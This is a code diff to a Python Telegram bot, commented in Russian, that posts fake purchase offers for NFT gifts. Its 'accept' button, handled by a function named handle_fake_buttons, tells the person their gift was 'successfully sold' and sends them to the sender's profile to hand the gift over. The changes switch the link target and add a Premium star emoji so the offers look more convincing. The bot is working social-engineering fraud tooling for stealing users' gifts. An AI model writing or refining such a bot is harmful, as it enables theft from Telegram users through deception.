@@ -20,14 +20,15 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-# --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ---
+# --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
 DEFAULT_TARGET = "Gifts_Replayer"
-# --------------------------------
 
 # --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
 TARGET_CHAT_ID = -1003842685177 
 INVITE_LINK = "https://t.me/+8JQGe7EezyUwNWQ6"
-# ------------------------------------
+
+# --- ID АНИМИРОВАННОЙ ЗВЕЗДЫ TELEGRAM PREMIUM ---
+PREMIUM_STAR_ID = "5848021027782661221"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -83,7 +84,7 @@ async def is_subscribed(user_id: int) -> bool:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
+        print(f"Ошибка проверки подписки: {e}")
         return False
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
@@ -128,7 +129,7 @@ async def update_gist_data(new_data: dict):
     except Exception as e:
         return False, f"Ошибка сети: {e}"
 
-# --- АДМИН ПАНЕЛЬ (ФИКС: ТОЛЬКО В ЛИЧКЕ) ---
+# --- АДМИН ПАНЕЛЬ ---
 @dp.message(F.chat.type == "private", Command("my_id"))
 async def cmd_my_id(message: types.Message):
     await message.answer(f"Ваш ID: <code>{message.from_user.id}</code>\nID Админа в боте: <code>{ADMIN_ID}</code>", parse_mode="HTML")
@@ -193,7 +194,7 @@ async def cmd_test_db(message: types.Message):
     await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")
 
 
-# --- ОСНОВНЫЕ КОМАНДЫ (ТОЛЬКО В ЛИЧКЕ) ---
+# --- ОСНОВНЫЕ КОМАНДЫ ---
 @dp.message(F.chat.type == "private", CommandStart())
 async def cmd_start(message: types.Message):
     text = (
@@ -259,7 +260,12 @@ async def handle_offer_command(message: types.Message):
         elif p_lower in ["ru", "en", "ua", "ar"]:
             lang = p_lower
 
-    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    if currency == "stars":
+        symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>' if message.from_user.is_premium else "⭐️"
+    elif currency == "gram":
+        symbol = "GRAM"
+    else:
+        symbol = "⭐️"
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match: return
@@ -293,7 +299,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША И ССЫЛКОЙ НА ОКНО ПОДАРКА ---
+# --- ОБРАБОТКА КНОПОК (ВЕДЕТ В ПРОФИЛЬ) ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -304,7 +310,12 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         
     action, gift_slug, amount, currency, lang = data_parts
     
-    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    if currency == "stars":
+        symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>' if callback.from_user.is_premium else "⭐️"
+    elif currency == "gram":
+        symbol = "GRAM"
+    else:
+        symbol = "⭐️"
     
     sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
     sender_id = callback.message.from_user.id
@@ -322,20 +333,22 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
     if action == "accept":
-        # Формируем deep-link для окна отправки подарка
+        # ССЫЛКА В ПРОФИЛЬ (&profile)
         if sender_username != "no_username":
-            gift_url = f"tg://send_gift?domain={sender_username}"
+            target_url = f"tg://resolve?domain={sender_username}&profile"
             display_name = f"@{sender_username}"
         else:
-            gift_url = f"tg://send_gift?user_id={sender_id}"
-            display_name = "пользователю"
+            target_url = f"tg://user?id={sender_id}&profile"
+            display_name = "пользователя"
 
-        new_text = msg_data["success"].format(
-            link=link, pretty_name=pretty_name, target_username=display_name.replace('@',''), symbol=symbol
+        new_text = (
+            f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
+            f"• Чтобы отправить подарок, нажмите кнопку ниже и перейдите в профиль {display_name}.\n"
+            f"• В профиле нажмите «Отправить подарок» и выберите <b>{pretty_name}</b>."
         )
         
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=gift_url)]
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=target_url)]
         ])
         alert_text = msg_data["alert"].format(target_username=display_name.replace('@',''))
     else:
